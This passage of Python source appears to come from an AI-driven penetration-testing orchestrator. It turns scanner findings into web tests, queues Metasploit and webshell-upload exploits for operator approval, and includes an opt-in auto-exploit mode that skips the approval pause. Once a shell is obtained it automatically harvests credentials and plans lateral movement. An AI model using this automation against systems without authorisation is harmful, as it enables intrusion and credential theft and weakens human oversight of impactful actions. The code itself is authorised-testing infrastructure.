    synth_on = _SYNTH_TESTS_DEFAULT if synthesize is None else bool(synthesize)
    seen_wstg = set()
    synth_count = 0
    for f in findings:
        if len(tests) >= _SURFACE_TEST_LIMIT:
            break
        issue = f.get("issue_type") or f.get("finding_type") or f.get("name")
        fname = f.get("name") or f.get("title")
        cwe = f.get("cwe")
        cwe_s = ",".join(cwe) if isinstance(cwe, list) else (str(cwe) if cwe else None)
        tags = f.get("tags")
        nuc = ",".join(t for t in tags if isinstance(t, str)) if isinstance(tags, list) else None
        furl = f.get("url")
        fip = f.get("ip") or f.get("host") or host
        fport = f.get("port")
        # Skip web finding-driven tests on a NON-web port: a finding on :22 (SSH)
        # etc. must not spawn an HTTP test that just hangs. Allow it only when the
        # port is a known web port, or the finding already carries an http URL.
        if fport is not None and fport not in _web_ports and not str(furl or "").startswith("http"):
            continue
        # Give the URL a real scheme (the endpoint returns bare host:port).
        furl = _web_url(furl, fip, fport)
        tgt = f"{fip}:{fport}" if fport else str(fip)
        try:
            g = json.loads(scan_tools.get_wstg_guidance(
                issue_type=issue, cwe=cwe_s, name=fname, nuclei_tags=nuc,
                target=tgt, url=furl))
        except Exception:  # noqa: BLE001
            g = {}
        ent = g.get("entry") if g.get("matched") else None
        # One test per (class, target) — a scan reports the same class many
        # times; prove it once. Keyed by the WSTG class when matched, else the
        # finding type (so synthesis for unmatched findings still de-dups).
        key = ((ent.get("id") if ent else None) or str(issue or "").lower(), fip, fport)
        if key in seen_wstg:
            continue
        seen_wstg.add(key)

        # OPT-IN synthesis: author a CUSTOM test for this finding instead of the
        # fixed map command. Bounded by _SURFACE_SYNTH_LIMIT; on any failure we
        # fall through to the deterministic map test below. The synthesized tier
        # is already fail-safe (test_synth), and impactful synth tests carry a
        # 'synth' exploit_ref so surface_plan queues them for human approval.
        if synth_on and synth_count < _SURFACE_SYNTH_LIMIT:
            fd = {"issue_type": issue, "name": fname, "cwe": cwe,
                  "url": furl, "target": tgt}
            st = _synthesize_finding_test(fd, g.get("guidance") or "", fip, fport)
            if st:
                tests.append(st)
                synth_count += 1
                continue

        if not ent:
            continue
        cmd = ent.get("command_rendered") or ent.get("command")
        cat = ent.get("category")
        wid = ent.get("wstg_id")
        wid_s = ",".join(wid) if isinstance(wid, list) else str(wid or "")
        impactful_ref = (ent.get("tier") == "impactful"
                         or cat in _IMPACTFUL_CATEGORIES)
        tier = _classify(cat, cmd or "", has_exploit_ref=impactful_ref)
        # webshell_upload can't dispatch as a plain wstg command — it needs the
        # webshell branch (PUT + RCE). Derive the collection path/scheme from the
        # finding URL and give it a webshell dispatch ref, same as the active
        # WSTG-CONF-06 probe below.
        if cat == "webshell_upload" and tier == "impactful":
            e_ref = _webshell_ref_from_url(furl, fip, fport, wid_s or "WSTG-CONF-06")
            e_tool = "webshell"
        else:
            e_ref = ({"source": "wstg", "module": wid_s,
                      "purpose": ent.get("wstg_note")} if tier == "impactful" else None)
            e_tool = _tool_head(cmd or "")
        tests.append({
            "name": f"WSTG {wid_s} {cat} @ {furl or tgt}",
            "host": fip, "service": "http", "port": fport,
            "tool": e_tool,
            "command": cmd, "category": cat, "tier": tier,
            "assertion": ent.get("assertion") or {},
            "exploit_ref": e_ref,
            # Link back to the scanner finding this test proves, so a PASS marks
            # THAT finding confirmed (not just "something passed on the host").
            "source_finding_id": f.get("id"),
            "source_finding_source": f.get("source"),
        })

    # Go through ALL recommendations: keep every candidate, only ORDER them so
    # the high-value ones (real exploits, webshell) come first — that ordering
    # is what the operator sees in the approval queue, and what survives if the
    # runaway backstop ever trims.
    return sorted(tests, key=_test_priority)


def _fmt_surface_tests(tests, limit: int = 30) -> str:
    """One line per surface test: tier, name, service:port and the actual command
    or MSF module it runs — the detail an operator needs to see what was examined,
    so the SurfaceTester message explains itself instead of just giving counts."""
    lines = []
    for t in (tests or [])[:limit]:
        svc = f"{t.get('service') or '?'}:{t.get('port') or '?'}"
        ref = t.get("exploit_ref") or {}
        what = (t.get("command") or ref.get("module") or "").strip()
        if len(what) > 140:
            what = what[:140] + "…"
        lines.append(f"  - [{t.get('tier', '?')}] {t.get('name', '?')} — {svc}"
                     + (f" — `{what}`" if what else ""))
    if tests and len(tests) > limit:
        lines.append(f"  … and {len(tests) - limit} more")
    return "\n".join(lines) or "  (none)"


def surface_plan(state: PentestState) -> dict:
    """Deterministic: pick+bound the target, build+classify tests, persist each,
    queue impactful ones. NO execution here — safe execution is the next node so
    the checkpointed interrupt never re-runs a real scan."""
    sid = state["session_id"]
    host = _host_of(state.get("surface_target_request"))
    if not host:
        try:
            av = json.loads(_tool(scan_tools.get_attack_vectors, limit=1, min_risk=40.0))
            vs = av.get("vectors") or []
            host = _host_of(vs[0].get("target")) if vs else None
        except Exception:  # noqa: BLE001
            host = None
    if not host:
        # The session's OWN target, which was here all along.
        #
        # Without this the phase skipped a host it had been given: with an empty
        # database there are no ranked attack vectors to fall back to, so a run
        # against a freshly-wiped target reported "No target host given" while
        # state["target"] held it.
        host = _host_of(state.get("target"))
    if not host:
        _msg(sid, "SurfaceTester",
             "No target host given and no ranked attack vector to fall back on — "
             "skipping surface tests.")
        _emit("langgraph_surface_analyzed", sid, {"mode": "no_target"})
        return {"phase": "surface_onward", "surface_target": None,
                "surface_tests": [], "pending_surface_tests": [],
                "findings": ["surface: no target"], "log": ["surface: no target"]}

    import db_utils
    eng = (get_agent_session(_sid(sid)) or {}).get("configuration", {})
    engagement_id = eng.get("engagement_id") if isinstance(eng, dict) else None

    # Hands-off web coverage: when scan dispatch is allowed, auto-trigger the
    # comprehensive web pipeline (→ZAP) for the target's web services so the
    # app-layer surface is enumerated without a manual step. Scope+dedup guarded;
    # fire-and-forget (its findings drive the next cycle).
    if bool(state.get("auto_execute")):
        try:
            _ensure_web_pipeline(host, sid, engagement_id)
        except Exception as e:  # noqa: BLE001
            _msg(sid, "SurfaceTester", f"[web pipeline autotrigger skipped: {e}]")

    candidates = _build_surface_tests(host, synthesize=state.get("surface_synthesize"))

    # Dedup guard: a vector already proven `shell` is not re-queued (protects a
    # one-shot mutating backdoor and stops pending_exploits/coverage churn).
    covered_shell = _vector_covered_keys(host)

    persisted, pending = [], []
    for c in candidates:
        vec = c.get("vector")
        if vec and vec.get("vector_id") in covered_shell:
            continue  # already have a shell from this vector — do not re-fire
        pending_exploit_id = None
        if c["tier"] == "impactful":
            # Queue the exploit for approval FIRST (side effect lives here, before
            # the interrupt) so the security_tests row can reference it.
            ref = c.get("exploit_ref") or {}
            # The dispatch source is what execute-by-id branches on. Most refs
            # dispatch under their own source (metasploit); a webshell test names
            # a `dispatch_source` ("webshell") distinct from its provenance
            # `source` ("wstg"), and carries structured `parameters` (the DAV
            # path/scheme) the exploit-runner needs. Fall back to the old
            # metasploit/rce defaults so nothing else changes.
            dispatch_source = ref.get("dispatch_source") or ref.get("source") or "metasploit"
            exploit_type = ref.get("exploit_type") or "rce"
            try:
                res = json.loads(_tool(
                    scan_tools.queue_exploit_for_approval,
                    exploit_id=ref.get("module") or c["name"],
                    source=dispatch_source,
                    exploit_title=c["name"],
                    customized_command=(c.get("command") or ref.get("module") or c["name"]),
                    target_ip=c["host"], target_port=c.get("port"),
                    target_service=c.get("service"), exploit_type=exploit_type,
                    parameters=ref.get("parameters"),
                    session_id=sid))
                pending_exploit_id = (res.get("pending_exploit_id")
                                      or res.get("id") if isinstance(res, dict) else None)
            except Exception as e:  # noqa: BLE001
                _msg(sid, "SurfaceTester", f"[queue failed for {c['name']}: {e}]")
                continue
            if not pending_exploit_id:
                continue
        try:
            test_id = db_utils.create_security_test(
                name=c["name"], tier=c["tier"], category=c["category"],
                target_ip=c["host"], target_port=c.get("port"),
                target_service=c.get("service"), command=c.get("command"),
                tool=c.get("tool"), assertion=c.get("assertion"),
                pending_exploit_id=pending_exploit_id,
                source_finding_source=c.get("source_finding_source"),
                source_finding_id=c.get("source_finding_id"),
                created_by_session=sid, engagement_id=engagement_id)
        except Exception as e:  # noqa: BLE001
            _msg(sid, "SurfaceTester", f"[persist failed for {c['name']}: {e}]")
            continue
        rec = {**c, "test_id": test_id, "pending_exploit_id": pending_exploit_id}
        persisted.append(rec)
        if vec:
            # Applicability is recorded now (planned) so "applicable but never
            # attempted" is visible even if the attempt never runs. The result is
            # updated to shell/no_shell/blocked when it executes.
            _vector_coverage_upsert(
                engagement_id, c["host"], c.get("port"), vec["vector_id"],
                c.get("service"), vec.get("source_path"), vec.get("mutates"),
                "planned", pending_exploit_id=pending_exploit_id)
        if c["tier"] == "impactful":
            pending.append(rec)
            try:
                db_utils.record_test_run(test_id, "impactful",
                                         status_override="skipped",
                                         command_run=c.get("command"),
                                         triggered_by="agent",
                                         triggered_by_session=sid,
                                         engagement_id=engagement_id)
            except Exception:  # noqa: BLE001
                pass

    safe_n = sum(1 for t in persisted if t["tier"] == "safe")
    # Show WHAT was examined, not just the counts: the distinct services/ports the
    # surface came from, and every test with its tier, service:port and the actual
    # command / MSF module it will run — so the message expands to explain itself.
    services = sorted({f"{t.get('service') or '?'}:{t.get('port') or '?'}"
                       for t in persisted})
    _msg(sid, "SurfaceTester",
         f"Attack surface of {host}: {len(persisted)} custom test(s) — "
         f"{safe_n} safe (run now), {len(pending)} impactful (need approval).\n\n"
         f"Services examined ({len(services)}): {', '.join(services) or 'none'}\n\n"
         f"Tests:\n{_fmt_surface_tests(persisted)}")
    _emit("langgraph_surface_analyzed", sid,
          {"target": host, "tests": len(persisted), "safe": safe_n,
           "impactful": len(pending)})
    _emit("langgraph_surface_test_planned", sid,
          {"target": host, "safe": safe_n, "impactful": len(pending)})
    return {"phase": "surface_safe_exec", "surface_target": host,
            "surface_tests": persisted, "pending_surface_tests": pending,
            "findings": [f"surface: {len(persisted)} tests planned for {host}"],
            "log": [f"surface_plan: {host} safe={safe_n} impactful={len(pending)}"]}


def surface_safe_exec(state: PentestState) -> dict:
    """Run the SAFE tests autonomously. SIDE EFFECTS (real scans) live here,
    BEFORE the checkpointed interrupt, so a resume never re-runs them."""
    sid = state["session_id"]
    import db_utils, time as _time
    tests = state.get("surface_tests") or []
    safe = [t for t in tests if t["tier"] == "safe"]
    results = []
    for t in safe:
        t0 = _time.time()
        out = {}
        try:
            out = json.loads(_tool(scan_tools.run_custom_test,
                                   tool=t["tool"], command=t["command"],
                                   target=t["host"], port=t.get("port"),
                                   service=t.get("service"), timeout=300))
        except Exception as e:  # noqa: BLE001
            out = {"ok": False, "status_code": 0, "error": str(e)}
        code = out.get("status_code")
        if code in (400, 403, 429):
            # Refused by the gate (out-of-scope / not allowlisted / at capacity).
            # Record and move on — never retried, never escalated to impactful.
            try:
                db_utils.record_test_run(t["test_id"], "safe",
                    command_run=t["command"], status_override="skipped",
                    output=f"[{code}] {out.get('detail') or out.get('error')}",
                    triggered_by="agent", triggered_by_session=sid)
            except Exception:  # noqa: BLE001
                pass
            continue
        exec_id = out.get("exec_id")
        exit_code, body, http_status = None, "", None
        if exec_id:
            # Poll to a wall-clock deadline that covers the tool's own timeout —
            # nuclei (6k templates) and gobuster (thousands of paths on a slow
            # host) take minutes, and a fixed 60s cap recorded them as empty
            # errors even though they completed. +30s margin over the 300s tool
            # timeout, then we give up and record what we have.
            deadline = _time.time() + _SAFE_TEST_POLL_SECONDS
            while _time.time() < deadline:
                _time.sleep(3)
                try:
                    st = json.loads(_tool(scan_tools.get_execution_status, exec_id=exec_id)) \
                        if hasattr(scan_tools, "get_execution_status") else {}
                except Exception:  # noqa: BLE001
                    st = {}
                # A transient read miss ({} or {"ok": false}) is not terminal —
                # keep polling rather than breaking out with empty output.
                if st.get("status") in ("completed", "failed", "timeout"):
                    exit_code = st.get("exit_code")
                    body = st.get("output") or ""
                    pr = st.get("parsed_results") or {}
                    http_status = pr.get("status_code") if isinstance(pr, dict) else None
                    break
        try:
            r = db_utils.record_test_run(
                t["test_id"], "safe", command_run=t["command"], exit_code=exit_code,
                output=body, duration_ms=int((_time.time() - t0) * 1000),
                tool_execution_id=exec_id, http_status=http_status,
                triggered_by="agent", triggered_by_session=sid)
            results.append({"test": t["name"], "status": r["status"],
                            "service": t.get("service"), "port": t.get("port"),
                            "command": t.get("command")})
            _emit("langgraph_surface_test_executed", sid,
                  {"test": t["name"], "status": r["status"], "lane": "safe"})
        except Exception as e:  # noqa: BLE001
            _msg(sid, "SurfaceTester", f"[record failed for {t['name']}: {e}]")

    passed = sum(1 for r in results if r["status"] == "pass")

    def _fmt_res(r):
        svc = f"{r.get('service') or '?'}:{r.get('port') or '?'}"
        mark = "✓ pass" if r.get("status") == "pass" else f"✗ {r.get('status')}"
        cmd = (r.get("command") or "").strip()
        cmd = (cmd[:120] + "…") if len(cmd) > 120 else cmd
        return f"  - {mark} — {r.get('test')} — {svc}" + (f" — `{cmd}`" if cmd else "")

    detail = "\n".join(_fmt_res(r) for r in results) or "  (none)"
    _msg(sid, "SurfaceTester",
         f"Ran {len(results)} safe test(s): {passed} proved (pass), "
         f"{len(results) - passed} not proven.\n\n{detail}")
    return {"phase": "surface_safe_done", "surface_safe_results": results,
            "findings": [f"surface: {passed}/{len(results)} safe tests proved"],
            "log": [f"surface_safe_exec: {passed}/{len(results)} pass"]}


def surface_approval(state: PentestState) -> dict:
    """Human gate for impactful surface tests. ONLY interrupt() — no side effect
    before the pause, so a resume re-entering this node repeats nothing (mirror
    of exploit_approval)."""
    from langgraph.types import interrupt
    pending = state.get("pending_surface_tests") or []
    decision = interrupt({
        "kind": "surface_test_approval",
        "session_id": str(state["session_id"]),
        "target": state.get("surface_target", "")[:300],
        "candidate": "\n".join(f"- {t['name']} (pending_exploit_id={t.get('pending_exploit_id')})"
                               for t in pending)[:2000],
        "prompt": ("Approve execution of the queued impactful test(s)? Reply via "
                   "POST /pentest/{session_id}/approve with "
                   '{"approved": true|false, "pending_exploit_id": "<uuid>"}'),
    })
    if isinstance(decision, dict):
        approved = bool(decision.get("approved"))
        note = str(decision.get("note") or "")
        pending_id = decision.get("pending_exploit_id")
    else:
        approved, note, pending_id = bool(decision), "", None
    sid = state["session_id"]
    _msg(sid, "SurfaceTester",
         f"[operator decision] approved={approved}"
         f"{' pending_exploit_id=' + str(pending_id) if pending_id else ''}",
         role="user")
    _emit("langgraph_surface_decision", sid,
          {"approved": approved, "pending_exploit_id": str(pending_id or "")})
    return {"phase": "surface_exec" if approved else "surface_onward",
            "surface_decision": {"approved": approved, "note": note[:500],
                                 "pending_exploit_id": str(pending_id or "") or None},
            "findings": [f"surface_approval: approved={approved}"],
            "log": [f"surface_approval: approved={approved}"]}


def surface_exec(state: PentestState) -> dict:
    """Execute the operator-approved impactful test via the SAME gated body, and
    record the run against its security_tests row."""
    sid = state["session_id"]
    import db_utils
    decision = state.get("surface_decision") or {}
    pending_id = decision.get("pending_exploit_id")
    if not pending_id:
        _msg(sid, "SurfaceTester",
             "[approved but no pending_exploit_id] Nothing executed.")
        return {"phase": "surface_onward",
                "findings": ["surface_exec: skipped (no id)"],
                "log": ["surface_exec skipped: no id"]}
    _mark_approved(pending_id, "operator (surface approval)",
                   (state.get("surface_decision") or {}).get("note"))
    result = _tool(scan_tools.execute_approved_exploit, pending_id)
    # Find the security_test that referenced this pending exploit.
    test = next((t for t in (state.get("pending_surface_tests") or [])
                 if str(t.get("pending_exploit_id")) == str(pending_id)), None)
    if test:
        # Read the exploit_results row id + success for the run record.
        try:
            import psycopg2
            from db_utils import get_db_dsn
            with psycopg2.connect(get_db_dsn()) as conn, conn.cursor() as cur:
                cur.execute("SELECT id, success, output, session_type, session_id "
                            "FROM public.exploit_results "
                            "WHERE pending_exploit_id=%s::uuid ORDER BY executed_at DESC LIMIT 1",
                            (pending_id,))
                r = cur.fetchone()
            er_id, success, out = (str(r[0]), r[1], r[2]) if r else (None, False, result)
            session_type, session_id = (r[3], r[4]) if r else (None, None)
            db_utils.record_test_run(
                test["test_id"], "impactful", command_run=test.get("command"),
                output=(out or "")[:20000], exploit_result_id=er_id,
                has_shell=bool(success),
                status_override=("pass" if success else "fail"),
                triggered_by="agent", triggered_by_session=sid)
            _update_vector_coverage_from_run(sid, test, success, session_id, out, pending_id, er_id)
            if success:
                _postex_enumerate(test.get("host"), session_type, session_id, sid)
        except Exception as e:  # noqa: BLE001
            _msg(sid, "SurfaceTester", f"[record impactful failed: {e}]")
    _msg(sid, "SurfaceTester", f"[execute_approved_exploit {pending_id}]\n{result[:1500]}")
    _emit("langgraph_surface_test_completed", sid,
          {"executed": True, "pending_exploit_id": str(pending_id)})
    return {"phase": "surface_onward",
            "findings": [f"surface_exec: executed {pending_id}"],
            "log": [f"surface_exec: {pending_id}"]}


def _postex_enumerate(host, session_type, session_id, sid):
    """A shell of ANY kind -> run bounded post-ex enumeration through it and
    harvest credentials (exploit-runner /postex/enumerate dispatches per shell
    type). Best-effort; never blocks or fails the run. Enumeration only."""
    if not session_type or str(session_type).lower() in ("none", "web_poc", ""):
        return
    if not session_id:
        _msg(sid, "SurfaceTester",
             f"[post-ex] shell on {host} ({session_type}) but no session id recorded — skipped")
        return
    try:
        import requests as _rq
        base = os.environ.get("EXPLOIT_RUNNER_URL", "https://exploit-runner:8017")
        payload = {"session_type": session_type, "session_id": str(session_id),
                   "host": host, "platform": "linux",
                   # chain into a scope-gated lateral spray PLAN (no dispatch —
                   # the plan still goes through approval).
                   "lateral": True}
        # A webshell drives commands through its invocation URL (with a {cmd}
        # slot), stored as session_id. The post-ex webshell provider reads
        # webshell_url, so pass it or enumeration has no channel.
        if str(session_type).lower() == "webshell":
            payload["webshell_url"] = str(session_id)
        r = _rq.post(f"{base}/postex/enumerate", json=payload,
                     headers={"x-api-key": os.environ.get("API_KEY", "changeme")},
                     timeout=120, verify=False)
        d = r.json() if r.status_code < 400 else {}
        lat = d.get("lateral") or {}
        _msg(sid, "SurfaceTester",
             f"[post-ex] {host} ({session_type}): priv={d.get('privileged')}, "
             f"users={len(d.get('local_users') or [])}, "
             f"creds_harvested={d.get('credentials_harvested', 0)}"
             + (f" → lateral plan: {lat.get('planned', 0)} target(s), "
                f"{lat.get('held_needs_approval', 0)} need approval" if lat else ""))
        _emit("langgraph_postex_enumerated", sid,
              {"host": host, "session_type": session_type,
               "privileged": d.get("privileged"),
               "credentials_harvested": d.get("credentials_harvested", 0)})
    except Exception as e:  # noqa: BLE001
        _msg(sid, "SurfaceTester", f"[post-ex enumerate failed: {e}]")


def _exec_one_impactful(sid, pending_id, test):
    """Execute ONE queued impactful test through the SAME scope-gated runner
    (execute_approved_exploit -> exploit-runner, which fails CLOSED on an
    out-of-scope target — so auto-firing can never reach a host outside scope),
    then record PROOF: the run's assertion is evaluated against the exploit
    output, so a test passes only when it actually demonstrated impact. When the
    exploit yields a SHELL, post-ex enumeration fires automatically. Returns the
    run status ('pass'|'fail'|'error') or None."""
    import db_utils
    _mark_approved(pending_id, "auto-exploit (operator opt-in)")
    result = _tool(scan_tools.execute_approved_exploit, pending_id)
    if not test:
        return None
    try:
        import psycopg2
        from db_utils import get_db_dsn
        with psycopg2.connect(get_db_dsn()) as conn, conn.cursor() as cur:
            cur.execute("SELECT id, success, output, session_type, session_id "
                        "FROM public.exploit_results "
                        "WHERE pending_exploit_id=%s::uuid ORDER BY executed_at DESC LIMIT 1",
                        (pending_id,))
            r = cur.fetchone()
        er_id, success, out = (str(r[0]), r[1], r[2]) if r else (None, False, result)
        session_type, session_id = (r[3], r[4]) if r else (None, None)
        rec = db_utils.record_test_run(
            test["test_id"], "impactful", command_run=test.get("command"),
            output=(out or "")[:20000], exploit_result_id=er_id,
            has_shell=bool(success), triggered_by="agent",
            triggered_by_session=sid)
        _update_vector_coverage_from_run(sid, test, success, session_id, out, pending_id, er_id)
        # A PASSED impactful test PROVED impact (command execution / RCE) against
        # this service — flag it as a FINDING on the asset even without a
        # persistent shell, so proven exploitation shows up in the asset's
        # findings, not only as a security_test pass (java-rmi, proftpd, etc. were
        # proved but never appeared as findings). Idempotent per (ip, port, label).
        if rec.get("status") == "pass":
            try:
                from etl import access as _ax
                _ip = (test.get("host") or test.get("ip") or test.get("target") or "")
                _ax.record_exploit_success_finding(
                    str(_ip).split("/")[0], test.get("port"),
                    test.get("service") or test.get("category") or "",
                    test.get("exploit_ref") or test.get("tool")
                        or test.get("test_id") or "exploit",
                    (out or "")[:4000],
                    session_type if success else "command_exec")
            except Exception as _fe:  # noqa: BLE001
                _log.debug("[%s] surface-test finding record failed: %s", sid, _fe)
        if success:
            _postex_enumerate(test.get("host"), session_type, session_id, sid)
        return rec.get("status")
    except Exception as e:  # noqa: BLE001
        _msg(sid, "SurfaceTester", f"[auto-exploit record failed for {pending_id}: {e}]")
        return None


# surface_auto_exec fires queued impactful tests SEQUENTIALLY in one graph node,
# and each MSF exploit can wait out its ~20s session timeout. 74 in one blocking
# loop is ~25 min, after which the watchdog marks the whole session 'stalled' and
# the remaining exploits never run. Bound the node by a wall-clock budget AND a
# count; anything not reached STAYS pending (recorded) for a later surface cycle
# or a manual run, so the graph advances instead of hanging.
SURFACE_AUTO_EXEC_BUDGET_S = int(os.environ.get("SURFACE_AUTO_EXEC_BUDGET_S", "1200"))
SURFACE_AUTO_EXEC_MAX = int(os.environ.get("SURFACE_AUTO_EXEC_MAX", "40"))


def surface_auto_exec(state: PentestState) -> dict:
    """AUTO-EXPLOIT (opt-in): fire queued impactful tests WITHOUT the human
    approval interrupt, capturing proof. The scope gate is NOT bypassed — each
    dispatch still goes through execute_approved_exploit -> the exploit-runner's
    scope gate, which refuses any out-of-scope target; those are recorded as
    blocked, never executed. This node has side effects and NO interrupt, so it
    replaces surface_approval only when auto-exploit is enabled.

    Bounded by SURFACE_AUTO_EXEC_MAX and SURFACE_AUTO_EXEC_BUDGET_S so a big queue
    cannot block the node long enough to be marked 'stalled'; deferred tests stay
    pending."""
    import time as _t
    sid = state["session_id"]
    pending = state.get("pending_surface_tests") or []
    deadline = _t.monotonic() + SURFACE_AUTO_EXEC_BUDGET_S
    _msg(sid, "SurfaceTester",
         f"[AUTO-EXPLOIT] firing up to {min(len(pending), SURFACE_AUTO_EXEC_MAX)} "
         f"of {len(pending)} queued impactful test(s) through the scope gate "
         f"(out-of-scope is refused, not run; budget {SURFACE_AUTO_EXEC_BUDGET_S}s).")
    proved, results, deferred = 0, [], 0
    for i, t in enumerate(pending):
        pid = t.get("pending_exploit_id")
        if not pid:
            continue
        # Stop cleanly on the count cap or the time budget; leave the rest pending.
        if len(results) >= SURFACE_AUTO_EXEC_MAX or _t.monotonic() >= deadline:
            deferred = len(pending) - i
            break
        status = _exec_one_impactful(sid, pid, t)
        ref = t.get("exploit_ref") or {}
        results.append({"test": t["name"], "status": status,
                        "service": t.get("service"), "port": t.get("port"),
                        "module": ref.get("module") or t.get("command")})
        if status == "pass":
            proved += 1
        _emit("langgraph_surface_test_completed", sid,
              {"executed": True, "auto": True, "pending_exploit_id": str(pid),
               "status": status})
    tail = (f"; {deferred} deferred (still pending — a later cycle or a manual "
            f"run picks them up)" if deferred else "")

    def _fmt_imp(r):
        svc = f"{r.get('service') or '?'}:{r.get('port') or '?'}"
        mark = "✓ SHELL/proved" if r.get("status") == "pass" else f"✗ {r.get('status')}"
        mod = (r.get("module") or "").strip()
        mod = (mod[:120] + "…") if len(mod) > 120 else mod
        return f"  - {mark} — {r.get('test')} — {svc}" + (f" — `{mod}`" if mod else "")

    detail = "\n".join(_fmt_imp(r) for r in results) or "  (none)"
    _msg(sid, "SurfaceTester",
         f"[AUTO-EXPLOIT] {proved}/{len(results)} impactful test(s) PROVED "
         f"(assertion held on the exploit output){tail}.\n\n{detail}")
    _emit("langgraph_surface_decision", sid,
          {"approved": True, "auto_exploit": True, "proved": proved,
           "total": len(results), "deferred": deferred})
    return {"phase": "surface_onward",
            "surface_decision": {"approved": True, "auto_exploit": True,
                                 "proved": proved, "total": len(results),
                                 "deferred": deferred},
            "findings": [f"surface_auto_exec: {proved}/{len(results)} proved"],
            "log": [f"surface_auto_exec: {proved}/{len(results)} proved, "
                    f"{deferred} deferred"]}


# ── graph ────────────────────────────────────────────────────────────────────
def _surface_onward(state: PentestState) -> str:
    """After the surface phase, chain into the exploit phase if it too is opted
    in, else the report."""
    return "exploit_plan" if state.get("exploit_phase") else "report"


def _after_analyze(state: PentestState) -> str:
    """Both extra phases are opt-in and independent. Surface runs first (it can
    generate impactful candidates the exploit phase would otherwise duplicate)."""
    if state.get("surface_test_phase"):
        return "surface_plan"
    return "exploit_plan" if state.get("exploit_phase") else "report"


def _after_surface_plan(state: PentestState) -> str:
    # Always run the safe lane (it no-ops with zero safe tests) before any gate.
    if state.get("surface_target"):
        return "surface_safe_exec"
    return _surface_onward(state)


def _after_surface_safe(state: PentestState) -> str:
    # No impactful tests -> chain onward. Otherwise: auto-exploit (fire through
    # the scope gate, no human pause) when opted in, else the human approval gate.
    if state.get("pending_surface_tests"):
        if state.get("surface_auto_exploit"):
            return "surface_auto_exec"
        return "surface_approval"
    return _surface_onward(state)


def _after_surface_approval(state: PentestState) -> str:
    decision = state.get("surface_decision") or {}
    return "surface_exec" if decision.get("approved") else _surface_onward(state)


def _after_exploit_plan(state: PentestState) -> str:
    return "exploit_approval" if state.get("exploit_candidate") else "report"


def _after_exploit_approval(state: PentestState) -> str:
    decision = state.get("exploit_decision") or {}
    return "exploit_exec" if decision.get("approved") else "report"


def build_graph(checkpointer=None):
    g = StateGraph(PentestState)
    g.add_node("recon", recon)
    g.add_node("scan", scan)
    g.add_node("analyze", analyze)
    g.add_node("exploit_plan", exploit_plan)
    g.add_node("exploit_approval", exploit_approval)
    g.add_node("exploit_exec", exploit_exec)
    g.add_node("post_enumeration", post_enumeration)
    g.add_node("surface_plan", surface_plan)
    g.add_node("surface_safe_exec", surface_safe_exec)
    g.add_node("surface_approval", surface_approval)
    g.add_node("surface_exec", surface_exec)
    g.add_node("surface_auto_exec", surface_auto_exec)
    g.add_node("report", report)
    g.add_edge(START, "recon")
    g.add_edge("recon", "scan")
    g.add_edge("scan", "analyze")
    g.add_conditional_edges("analyze", _after_analyze,
                            {"surface_plan": "surface_plan",
                             "exploit_plan": "exploit_plan", "report": "post_enumeration"})
    # Surface-test phase: plan -> safe-exec (side effects here, before the
    # checkpointed interrupt) -> approval -> exec, then chain onward.
    g.add_conditional_edges("surface_plan", _after_surface_plan,
                            {"surface_safe_exec": "surface_safe_exec",
                             "exploit_plan": "exploit_plan", "report": "post_enumeration"})
    g.add_conditional_edges("surface_safe_exec", _after_surface_safe,
                            {"surface_approval": "surface_approval",
                             "surface_auto_exec": "surface_auto_exec",
                             "exploit_plan": "exploit_plan", "report": "post_enumeration"})
    g.add_conditional_edges("surface_auto_exec", _surface_onward,
                            {"exploit_plan": "exploit_plan", "report": "post_enumeration"})
    g.add_conditional_edges("surface_approval", _after_surface_approval,
                            {"surface_exec": "surface_exec",
                             "exploit_plan": "exploit_plan", "report": "post_enumeration"})
    g.add_conditional_edges("surface_exec", _surface_onward,
                            {"exploit_plan": "exploit_plan", "report": "post_enumeration"})
    g.add_conditional_edges("exploit_plan", _after_exploit_plan,
                            {"exploit_approval": "exploit_approval", "report": "post_enumeration"})
    g.add_conditional_edges("exploit_approval", _after_exploit_approval,
                            {"exploit_exec": "exploit_exec",
                             "report": "post_enumeration"})
    # EVERY terminal route goes through post_enumeration, not just the exploit one.
    #
    # The graph used to send each of these straight to report, so a run that
    # recovered ten working credentials and never found an exploit candidate —
    # exactly what happened on 192.168.1.150 — stopped without enumerating any
    # of the access it had just obtained.
    #
    # The routing FUNCTIONS still return "report"; only where that lands
    # changes. post_enumeration no-ops cleanly and says WHY when there is nothing to
    # enumerate, so a run that found nothing pays nothing for passing through.
    g.add_edge("exploit_exec", "post_enumeration")
    # THE CYCLE. post_enumeration goes round again while a pass is still
    # analysing or proposing something new, and reports once it settles —
    # "everything has been analysed" made operational rather than assumed.
    # MAX_ENUMERATION_CYCLES is the backstop: LangGraph's recursion limit RAISES,
    # and a run that ends in an exception produces no report at all.
    g.add_conditional_edges("post_enumeration", _after_post_enumeration,
                            {"post_enumeration": "post_enumeration",
                             "report": "report"})
    g.add_edge("report", END)
    return g.compile(checkpointer=checkpointer)


_build = build_graph  # back-compat alias (Phase 1 name)


# ── run / resume ─────────────────────────────────────────────────────────────
def _interrupt_payload(result: dict, graph=None, cfg=None) -> Optional[dict]:
    """The interrupt value if the graph paused, else None.

    `invoke` puts it under `__interrupt__`; get_state is the fallback so a
    version change in that key does not silently turn a paused session into a
    'completed' one."""
    ints = (result or {}).get("__interrupt__")
    if ints:
        first = ints[0] if isinstance(ints, (list, tuple)) else ints
        val = getattr(first, "value", None)
        return val if isinstance(val, dict) else {"value": val}
    if graph is not None and cfg is not None:
        try:
            snap = graph.get_state(cfg)
            for task in (getattr(snap, "tasks", None) or []):
                for itr in (getattr(task, "interrupts", None) or []):
                    val = getattr(itr, "value", None)
                    return val if isinstance(val, dict) else {"value": val}
        except Exception:
            pass
    return None


def _saver_cm():
    from langgraph.checkpoint.postgres import PostgresSaver
    return PostgresSaver.from_conn_string(os.environ.get("DB_DSN"))


def _interim_report(sid: str, final: dict, target: str, task: str,
                    auto_execute: bool, exploit_phase: bool) -> None:
    """Write the report BEFORE parking for approval.

    WHY: `report` sits after `exploit_approval` in the graph, so an approval
    interrupt held the finished work hostage — recon, the scans, the analysis and
    the whole surface phase were done, and none of it was written up until a
    human came back. That human may not look until tomorrow.

    Everything that does not need a human should land now. The exploit execution
    is the only thing that waits, and the resume writes the final report over the
    top with the operator's decision included.

    Best-effort: a reporting failure must never stop the session parking, because
    parking is what keeps the approval safe.
    """
    try:
        state = dict(final or {})
        state.setdefault("session_id", sid)
        state["target"] = state.get("target") or target or ""
        state["task"] = state.get("task") or task or ""
        state.setdefault("findings", [])
